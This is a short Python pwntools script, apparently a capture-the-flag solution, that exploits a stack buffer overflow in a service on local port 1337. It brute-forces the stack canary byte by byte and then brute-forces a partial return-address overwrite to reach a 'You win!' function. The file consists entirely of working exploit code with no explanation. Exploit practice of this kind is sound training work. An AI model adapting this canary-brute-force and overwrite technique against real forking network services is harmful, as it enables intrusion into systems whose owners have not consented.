from pwn import *


canary = b'\x00'
for i in range(7):
    guess = 1

    while True:
        b_guess = int.to_bytes(guess,1,'little')
        r = remote('0.0.0.0','1337')
        r.sendlineafter(b'Payload size: ',b'2000')
        r.recvuntil(b'bytes)!\n')
        r.send(b'a'*0x88+canary+b_guess)
        r.recvuntil(b'Goodbye!\n')
        a = r.recv(timeout=0.5)
        
        if b'smashing' not in a :
            canary += b_guess
            print(canary)
            r.close()
            break

        guess += 1 
        r.close()
guess = 0
while True:
    b_guess = int.to_bytes(guess,1,'little')
    r = remote('0.0.0.0','1337')
    r.sendlineafter(b'Payload size: ',b'2000')
    r.send(b'a'*0x88 + canary + b'a'*0x8 + b'\xfd'+b_guess)
    r.recvuntil(b'Goodbye!\n')
    a = r.recv(timeout=0.5)
    if b'You win!' in a :
        break
    guess += 16
    r.close()
print(a)
r.interactive()